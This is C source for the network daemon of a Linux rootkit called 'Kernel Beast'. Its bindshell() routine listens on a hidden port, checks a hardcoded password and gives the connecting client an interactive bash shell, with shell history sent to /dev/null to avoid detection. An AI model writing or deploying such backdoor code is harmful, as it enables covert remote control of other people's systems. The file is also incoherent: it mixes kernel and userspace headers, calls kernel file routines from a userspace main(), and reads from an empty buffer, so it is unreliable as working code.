/*
Kernel Beast Ver #1.0 - Network Daemon
Copyright Ph03n1X of IPSECS (c) 2011
Get more research of ours http://ipsecs.com
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include "config.h" 

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/tty.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <net/tcp.h>

#include <linux/socket.h>
#include <linux/net.h>
#include <linux/unistd.h>
#include <asm/socket.h>


#include "config.h"
#define MAXLISTEN 5

void bindshell();
void error_ret(char *);
void enterpass(int);

char *argv[] = { "bash", "-i", NULL };
char *envp[] = { "TERM=linux", "PS1=$", "BASH_HISTORY=/dev/null",
                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/_sh4x_","HISTFILE=/dev/null",
                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

char *banner = 
  "\npassword:\n";

void error_ret(char *s){
  printf("ERROR! Error occured on your system!\n");
  perror(s);
  exit(-1);
}

void enterpass(int s){
  char *prompt="Password [displayed to screen]: ";
  char *motd="<< Welcome >>\n";
  char buffer[64];

  //write(s,banner,strlen(banner));
  //write(s,prompt,strlen(prompt));
  read(s,buffer,sizeof(buffer));
  if(!strncmp(buffer, _RPASSWORD_, strlen(_RPASSWORD_))) {
    write(s,motd,strlen(motd));
  }else {
    //write(s,"Wrong!\n", 7);
    close(s); 
    _exit(0);
  }
}

void bindshell()
{
  struct sockaddr_in sockaddr,cliaddr;
  int sock,cli,clilen,pid,child;
  FILE *fd;

  sockaddr.sin_family           = AF_INET;
  sockaddr.sin_port             = htons(_HIDE_PORT_);
  sockaddr.sin_addr.s_addr      = INADDR_ANY;

  sock=socket(AF_INET, SOCK_STREAM, 0);
  if(sock < 0)
    error_ret("socket");
  if(bind(sock,(struct sockaddr *)&sockaddr,sizeof(sockaddr))<0)
    error_ret("bind");
  if(listen(sock,MAXLISTEN)<0)
    error_ret("listen");
  if((pid=fork())!=0){
    printf("Daemon running with PID = %i\n",pid);
    exit(0);
  }

  setsid();  
  chdir(_H4X_PATH_);
  umask(0);
  close(0);
  
  signal(SIGCHLD, SIG_IGN);
  while(1){
    clilen=sizeof(cliaddr);
    cli=accept(sock,(struct sockaddr *)&cliaddr,&clilen);
    if(cli<0)
      continue;
    if((child=fork())==0){
      close(sock);
      dup2(cli,0);
      dup2(cli,1);
      dup2(cli,2);
	 	//close(0);
		//fid = fcntl(cli, F_DUPFD, 0);
      enterpass(cli);
      execve("/bin/bash", argv, envp);
      close(child);
      close(cli);
    }
  }
  return;
}

/*
Modified from log_to_file() mercenary code
why don't we modify thc-vlogger? because that'z your job
*/
int hasInit()
{
	struct file *file = NULL;
  	mm_segment_t fs;
  	int error;
	char fbuf[100]={'\0'};
  
  	/*log name*/
  	//snprintf(accountlog,sizeof(accountlog),"%s/%s.%i",_H4X_PATH_,_LOGFILE_,current->uid);
  	file = filp_open(MAGIC_REBOOT, O_CREAT|O_APPEND, 00644);
  	if(IS_ERR(file)){
    	error=PTR_ERR(file);
    	goto out;
  	}
  
  	error = -EACCES;
  	if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  		goto out_err;
  
  	error = -EIO;
  	if(!file->f_op->write)
  		goto out_err;
  
  	error = 0;
  	fs = get_fs();
  	set_fs(KERNEL_DS);
  	file->f_op->read(file,fbuf,strlen(fbuf)-1,0);
  	set_fs(fs);
  	filp_close(file,NULL); 
	printf("File Conten:%s\n",fbuf);
  	goto out;
    
  out:
	return error;

  out_err:
	filp_close (file,NULL);
	goto out;
}


int main(int argc, char **argv)
{
	//bindshell();
	hasInit();
  	return 0;
}
